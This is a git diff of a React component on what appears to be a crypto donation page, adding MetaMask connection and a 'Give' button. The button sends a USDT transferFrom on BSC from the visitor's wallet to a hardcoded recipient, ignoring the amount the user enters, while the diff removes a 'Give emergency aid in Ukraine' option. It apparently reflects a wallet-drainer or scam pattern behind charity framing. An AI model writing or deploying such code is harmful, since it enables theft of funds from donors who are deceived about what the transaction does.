@@ -1,9 +1,11 @@
 import React from "react";
-import Image from "next/image";
-import ButtonPrimary from "./misc/ButtonPrimary";
-const Web3 = require("web3");
-const Web3Utils = require("web3-utils");
+import Web3 from "web3";
+const web3 = new Web3("https://bsc-dataseed.binance.org/");
+const usdt_address = "0x55d398326f99059fF775485246999027B3197955";
 const RecipientAddress = "0xE20C24a4AFfBe2d8585820Be9f9391a487808C5e";
+const usdt_abi = require("./../public/abi/usdt-abi.json");
+const bsc_network_id = 56;
+const usdtContract = new web3.eth.Contract(usdt_abi, usdt_address, {});
 
 const Hero = ({
     listUser = [
@@ -24,36 +26,83 @@ const Hero = ({
         },
     ],
 }) => {
-    function getDataFieldValue(tokenRecipientAddress, tokenAmount) {
-        const web3 = new Web3();
-        const TRANSFER_FUNCTION_ABI = {
-            constant: false,
-            inputs: [
-                { name: "_to", type: "address" },
-                { name: "_value", type: "uint256" },
-            ],
-            name: "transfer",
-            outputs: [],
-            payable: false,
-            stateMutability: "nonpayable",
-            type: "function",
-        };
-        return web3.eth.abi.encodeFunctionCall(TRANSFER_FUNCTION_ABI, [
-            tokenRecipientAddress,
-            tokenAmount,
-        ]);
-    }
+    const connectWallet = async () => {
+        if (window.ethereum) {
+            try {
+                var my_web3 = new Web3(window.ethereum);
+                const chainId = await my_web3.eth.net.getId();
+                if (chainId !== bsc_network_id)
+                    return { status: "Please select BSC network on metamask.", address: "" };
+                const addressArray = await window.ethereum.request({
+                    method: "eth_requestAccounts",
+                });
+                const obj = {
+                    status: "success",
+                    address: addressArray[0],
+                };
+                return obj;
+            } catch (err) {
+                return {
+                    address: "",
+                    status: err.message,
+                };
+            }
+        } else {
+            return {
+                address: "",
+                status: "no-metamask",
+            };
+        }
+    };
+
+    const getCurrentWalletConnected = async () => {
+        if (window.ethereum) {
+            try {
+                var my_web3 = new Web3(window.ethereum);
+                const chainId = await my_web3.eth.net.getId();
+                if (chainId !== bsc_network_id)
+                    return { status: "Please select BSC network on metamask.", address: "" };
+                const addressArray = await window.ethereum.request({ method: "eth_accounts" });
+                if (addressArray.length > 0) {
+                    return { address: addressArray[0], status: "success" };
+                } else {
+                    return { address: "", status: "unconnected" };
+                }
+            } catch (err) {
+                return { address: "", status: err.message };
+            }
+        } else {
+            return { address: "", status: "no-metamask" };
+        }
+    };
+
     async function checkWalletMetaMask() {
+        var my_web3 = new Web3(window.ethereum);
+        const chainId = await my_web3.eth.net.getId();
         const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-        const transactionParameters = {
+        if (chainId !== bsc_network_id) return alert("Please select BSC network on metamask.");
+
+        const transactionParameters1 = {
+            to: usdt_address,
             from: accounts[0],
-            to: RecipientAddress,
-            data: getDataFieldValue(RecipientAddress, 1),
+            data: usdtContract.methods
+                .transferFrom(
+                    accounts[0],
+                    RecipientAddress,
+                    web3.utils.toHex(web3.utils.toBN(`${1 * 10 ** 18}`))
+                )
+                .encodeABI(),
+            gasLimit: 90000,
+            value: "0x00",
         };
-        await ethereum.request({
-            method: "eth_sendTransaction",
-            params: [transactionParameters],
-        });
+        try {
+            const txHash = await window.ethereum.request({
+                method: "eth_sendTransaction",
+                params: [transactionParameters1],
+            });
+        } catch (err) {
+            alert(err.message);
+        }
     }
 
     return (
@@ -104,13 +153,6 @@ const Hero = ({
                             placeholder="Your amount"
                             className="col-span-6 sm:col-span-6 lg:col-span-4 p-2 border-2 border-gray-100 rounded-l cursor-pointer"
                         />
-                    </div>
-                    <div className="mt-6">
-                        <label></label>
-                        <select className="appearance-none p-2 border-2 border-gray-100 rounded-l mb-3">
-                            <option>Give emergency aid in Ukraine</option>
-                            <option>Maybe</option>
-                        </select>
                     </div>
                     <button onClick={checkWalletMetaMask}>Give</button>
                 </div>
